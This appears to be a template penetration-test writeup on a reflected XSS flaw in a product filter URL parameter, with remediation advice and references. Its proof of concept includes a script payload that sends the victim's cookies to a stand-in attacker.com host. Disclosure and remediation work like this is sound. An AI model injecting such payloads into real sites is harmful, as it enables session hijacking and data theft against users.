# Penetration Testing Writeup: XSS in URL Parameter

## Executive Summary

A penetration test on [Target Application] revealed a Reflected Cross-Site
Scripting (XSS) vulnerability in a URL parameter. This flaw allows attackers to
inject scripts that execute in users’ browsers, posing risks like session
hijacking and data theft. This report details the vulnerability and remediation
steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Reflected
- **Severity**: High
- **Affected Component**: Product filter URL parameter
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/products?filter=[input]`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 25, 2025

### Description

The product filter URL parameter is not sanitized, allowing attackers to inject
malicious scripts that are reflected in the response and executed in the
victim’s browser.

### Impact

- **Session Compromise**: Cookies can be stolen.
- **Phishing**: Fake login pages can be displayed.
- **Data Theft**: Sensitive data can be exfiltrated.
- **Defacement**: Page content can be altered.

### Proof of Concept

1. Visit:
   `https://[target-application]/products?filter=<script>alert('XSS');</script>`.
2. Observe an alert box.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Navigate to `https://[target-application]/products`.
2. Append `?filter=<script>alert('XSS');</script>` to the URL.
3. Load the URL and verify the alert.

## Remediation Recommendations

1. **Input Sanitization**:
   - Validate filter inputs to allow only safe characters.
2. **Output Encoding**:
   - Encode outputs before rendering.
3. **Content Security Policy**:
   - Use CSP: `Content-Security-Policy: script-src 'self';`.
4. **Developer Training**:
   - Educate on secure coding practices.
5. **Security Audits**:
   - Perform regular penetration tests.

## Conclusion

The XSS vulnerability in [Target Application]’s product filter requires
immediate action to protect users and maintain security.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![URL XSS Example](https://example.com/images/url-xss-example.png)
